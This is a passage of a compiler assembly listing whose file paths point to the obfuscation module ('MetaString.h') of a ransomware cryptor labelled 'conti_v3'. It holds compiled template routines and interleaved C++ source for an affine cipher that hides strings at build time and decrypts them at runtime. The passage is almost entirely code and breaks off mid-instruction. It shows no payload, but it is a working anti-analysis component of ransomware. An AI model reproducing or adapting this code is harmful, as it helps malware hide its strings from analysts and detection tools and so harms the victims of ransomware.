  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0022d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00231	88 85 c0 00 00
	00		 mov	 BYTE PTR tv182[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00237	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0023e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 7b	 sub	 eax, 123		; 0000007bH
  0002d	6b c0 e6	 imul	 eax, eax, -26
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 53	 imul	 eax, eax, 83		; 00000053H
  0002d	83 c0 7b	 add	 eax, 123		; 0000007bH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 08	 cmp	 QWORD PTR i$1[rbp], 8
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv154 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00185	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00189	88 85 c0 00 00
	00		 mov	 BYTE PTR tv154[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0018f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00196	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0019d	5f		 pop	 rdi
  0019e	5d		 pop	 rbp
  0019f	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<83,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 48	 sub	 eax, 72			; 00000048H
  0002d	6b c0 d3	 imul	 eax, eax, -45		; ffffffffffffffd3H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 4f	 imul	 eax, eax, 79		; 0000004fH
  0002d	83 c0 48	 add	 eax, 72			; 00000048H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 12	 cmp	 QWORD PTR i$1[rbp], 18
